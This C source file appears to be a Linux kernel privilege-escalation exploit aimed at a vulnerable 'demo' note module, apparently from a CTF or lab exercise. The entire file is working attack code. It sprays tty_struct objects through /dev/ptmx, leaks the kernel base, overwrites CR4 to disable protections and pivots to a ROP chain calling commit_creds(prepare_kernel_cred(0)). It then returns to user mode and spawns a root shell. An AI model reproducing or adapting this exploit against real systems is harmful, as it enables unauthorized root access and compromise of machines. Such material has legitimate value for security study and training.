#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdint.h>
#include <syscall.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <signal.h>
#include <assert.h>
#include <stdint.h>

#include "demo_note.h"

#define ASM __asm__
#define PAUSE scanf("%*c");


void get_shell(int sig){
	printf( "[*] get shell\n" );
	system("sh");
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    ASM("mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        );
    puts("[*]status has been saved.");
}



int main(int argc,char** argv){
    if(argc < 2){
        puts("Need kernel module base");
        return 0;
    }
    save_status();

    int fd = open("/dev/demo", O_RDWR);

    int pfd[0x100];
	for( int i = 0 ; i < 0x100 ; ++i ){
        pfd[i] = open( "/dev/ptmx" , O_RDWR | O_NOCTTY ); // tty_struct
        if (pfd[i] == -1)
            printf("open ptmx err\n");
    }
	for( int i = 0 ; i < 0x100 ; ++i )
        close(pfd[i]);


    size_t buf[0x100] = {0};
    add_note(fd, 0x2c0);
    read_note(fd, 0, buf);

    size_t kbase = buf[3] - 0x10a6f20;
    printf( "[*] kernel base -> %p\n", kbase );

    size_t rop[100], rsp[0x100];
    size_t prepare_kernel_cred = kbase + 0xbc7e0;
    size_t commit_creds = kbase + 0xbc350;
    size_t pop_rdi = kbase + 0x815d0;
    size_t mov_rdi_rax = kbase + 0x29951; // mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret; 
    size_t swapgs = kbase + 0x6def0; // swapgs; ret; 
    size_t iretq = kbase + 0x3b1e4; // iretq; pop rbp; ret; 
    
    size_t pop_rsp = kbase + 0x14b340;

    size_t kobase = strtoull(argv[1],0,16);
    size_t mov_cr4_rdi = kobase + 0xa9;

    int i = -1;
    rop[++i] = pop_rdi;
    rop[++i] = 0x6f0;
    rop[++i] = mov_cr4_rdi; // overwrite cr4 to 0x6f0
    rop[++i] = pop_rsp;
    rop[++i] = rsp;

    i = -1;
    rsp[++i] = pop_rdi;
    rsp[++i] = 0;
    rsp[++i] = prepare_kernel_cred;
    rsp[++i] = mov_rdi_rax;
    rsp[++i] = 0;
    rsp[++i] = 0;
    rsp[++i] = commit_creds;
    rsp[++i] = swapgs;
    rsp[++i] = iretq;
    rsp[++i] = get_shell;
    rsp[++i] = user_cs;
    rsp[++i] = user_rflags;
    rsp[++i] = user_sp;
    rsp[++i] = user_ss;

    req.arg1 = rop;
    ioctl( fd, DEMO_OVERFLOW , &req );

    return 0;
}